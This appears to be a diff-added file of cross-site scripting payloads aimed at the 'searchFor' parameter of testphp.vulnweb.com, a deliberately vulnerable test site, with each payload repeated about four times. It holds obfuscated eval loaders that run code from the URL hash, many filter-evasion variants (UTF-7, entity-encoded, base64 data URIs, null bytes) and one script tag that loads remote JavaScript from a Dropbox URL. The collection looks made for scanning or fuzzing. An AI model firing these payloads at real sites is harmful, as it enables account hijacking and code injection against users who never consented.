+searchFor:a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:eval.call(this,unescape.call(this,location))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:eval.call(this,unescape.call(this,location))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:eval.call(this,unescape.call(this,location))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:eval.call(this,unescape.call(this,location))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:_=eval,__=unescape,___=document.URL,_(__(___))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:_=eval,__=unescape,___=document.URL,_(__(___))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:_=eval,__=unescape,___=document.URL,_(__(___))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:_=eval,__=unescape,___=document.URL,_(__(___))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(location)with(hash)eval(substring(1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(location)with(hash)eval(substring(1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(location)with(hash)eval(substring(1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(location)with(hash)eval(substring(1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:A=alert;A(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:A=alert;A(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:A=alert;A(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:A=alert;A(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa'><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa'><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa'><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa'><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa"><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa"><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa"><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://aa"><script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(document.__parent__)alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(document.__parent__)alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(document.__parent__)alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:with(document.__parent__)alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:y=<a>alert</a>;content[y](123)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:y=<a>alert</a>;content[y](123)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:y=<a>alert</a>;content[y](123)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:y=<a>alert</a>;content[y](123)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<XSS>=&{()}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<XSS>=&{()}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<XSS>=&{()}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<XSS>=&{()}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><svg><script>alert(1)-%26apos%3B
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><svg><script>alert(1)-%26apos%3B
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><svg><script>alert(1)-%26apos%3B
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><svg><script>alert(1)-%26apos%3B
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:anythinglr00</script><script>alert(document.domain)</script>uxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:anythinglr00</script><script>alert(document.domain)</script>uxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:anythinglr00</script><script>alert(document.domain)</script>uxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:anythinglr00</script><script>alert(document.domain)</script>uxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:nythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:nythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:nythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:nythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javas&#99;ript:alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javas&#99;ript:alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javas&#99;ript:alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javas&#99;ript:alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123);</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123);</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123);</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123);</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT>alert("XSS");</ScRipT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT>alert("XSS");</ScRipT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT>alert("XSS");</ScRipT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT>alert("XSS");</ScRipT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(123)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert("hellox worldss");</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert("hellox worldss");</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert("hellox worldss");</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert("hellox worldss");</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(/XSS/)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(/XSS/)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(/XSS/)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert(/XSS/)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><script>alert(1)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><script>alert(1)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><script>alert(1)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><script>alert(1)</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRiPt>alert(1)</sCriPt>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRiPt>alert(1)</sCriPt>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRiPt>alert(1)</sCriPt>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRiPt>alert(1)</sCriPt>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=xss onerror=alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=xss onerror=alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=xss onerror=alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=xss onerror=alert(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=`%00` onerror=this.onerror=confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=`%00` onerror=this.onerror=confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=`%00` onerror=this.onerror=confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=`%00` onerror=this.onerror=confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><isindex formaction="javascript&colon;confirm(1)"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><isindex formaction="javascript&colon;confirm(1)"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><isindex formaction="javascript&colon;confirm(1)"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><isindex formaction="javascript&colon;confirm(1)"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+
